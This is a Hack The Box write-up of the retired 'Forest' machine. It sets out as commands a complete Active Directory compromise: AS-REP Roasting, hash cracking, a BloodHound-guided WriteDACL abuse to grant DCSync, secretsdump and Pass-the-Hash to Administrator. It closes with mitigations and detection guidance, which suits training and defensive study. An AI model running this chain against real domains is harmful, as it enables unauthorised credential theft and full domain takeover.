---
machine: Forest
os: Windows
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [ad, kerberos, asrep, bloodhound, dcsync]
---

# Forest — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

A `htb.local` DC (Server 2016) with Exchange installed. Anonymous RPC lists every user and `svc-alfresco` has preauthentication disabled, so AS-REP Roasting takes it. That account sits in `Account Operators`, which can add users to `Exchange Windows Permissions`, a group holding `WriteDACL` on the domain. Create a user, grant DCSync, and `secretsdump` yields `Administrator`'s hash, reused via Pass-the-Hash.

## Recon

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
53/tcp    domain
88/tcp    kerberos-sec
135/tcp   msrpc
139/tcp   netbios-ssn
389/tcp   ldap
445/tcp   microsoft-ds
464/tcp   kpasswd5
636/tcp   ldaps
3268/tcp  ldap (Global Catalog)
5985/tcp  http (WinRM)
9389/tcp  adws
```

```bash
echo "<IP> htb.local FOREST.htb.local" | sudo tee -a /etc/hosts
```

## Enumeration

Anonymous SMB is denied, RPC is not:

```bash
rpcclient -U "" -N <IP> -c "enumdomusers"
```

```text
Administrator, Guest, krbtgt, sebastien, lucinda, svc-alfresco,
andy, mark, santi, EXCH01$, FOREST$
```

Anonymous `ldapsearch` confirms the same users and the Exchange install (`Exchange Windows Permissions` group, `HealthMailbox` accounts). That detail is half the escalation.

## Foothold

```bash
GetNPUsers.py htb.local/ -usersfile users.txt -no-pass -dc-ip <IP> -format john
```

Only `svc-alfresco` returns a hash: `UF_DONT_REQUIRE_PREAUTH` is set.

```bash
john hash.txt --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt
```

```bash
evil-winrm -i <IP> -u svc-alfresco -p '<password>'
```

## Escalation

```powershell
upload SharpHound.exe
./SharpHound.exe -c All --zipfilename forest.zip
download forest.zip
```

In BloodHound, the path from `SVC-ALFRESCO` is:

```text
SVC-ALFRESCO → Service Accounts → Privileged IT Accounts
             → Account Operators → (GenericAll)
             → Exchange Windows Permissions → (WriteDacl)
             → HTB.LOCAL → DCSync
```

`Account Operators` can modify most accounts and groups, but not protected ones; `Exchange Windows Permissions` is modifiable and holds `WriteDACL` on the domain object, inherited from the Exchange install.

```powershell
net user hacker 'Password123!' /add /domain
net group "Exchange Windows Permissions" hacker /add
```

```powershell
Import-Module .\PowerView.ps1
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\hacker', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" `
  -PrincipalIdentity hacker -Rights DCSync
```

`-Credential` matters: the LDAP call must run as `hacker`, the one holding `WriteDACL`, not as the current session user.

```bash
secretsdump.py htb.local/hacker:'Password123!'@<IP>
```

```bash
evil-winrm -i <IP> -u Administrator -H <hash>
```

## Evidence

- `whoami` → `htb\svc-alfresco`, then `htb\administrator`.
- BloodHound import showing the path to Domain Admins.
- `Administrator`'s NTLM hash (redacted).

## Lessons learned

- Anonymous RPC still returns the user list on legacy domains; it is step one before any roasting.
- AS-REP Roasting needs no credentials, only an account without preauthentication.
- Exchange creates groups with dangerous permissions by design; `Account Operators` + `Exchange Windows Permissions` is a known path.
- `WriteDACL` on the domain is equivalent to Domain Admin: it lets you grant yourself DCSync.
- With WinRM open, the hash is worth more than the plaintext password (Pass-the-Hash).

## Mitigations and detection

- Remove `svc-alfresco` (and any account) from `Account Operators`; it is a legacy group rarely needed.
- Review the permissions Exchange leaves on the domain and drop `WriteDACL` for groups that do not need it.
- Require Kerberos preauthentication for every account and audit `userAccountControl`.
- Long service passwords; monitor 4768 events without preauthentication.
- Detection: 4662 events on the domain object, `DS-Replication-Get-Changes` grants, user creation and privileged group additions.
- MITRE: T1558.004 (AS-REP Roasting), T1098, T1003.006 (DCSync).

## References

- MITRE ATT&CK: T1558.004, T1098, T1003.006.
- BloodHound documentation on `WriteDacl`.
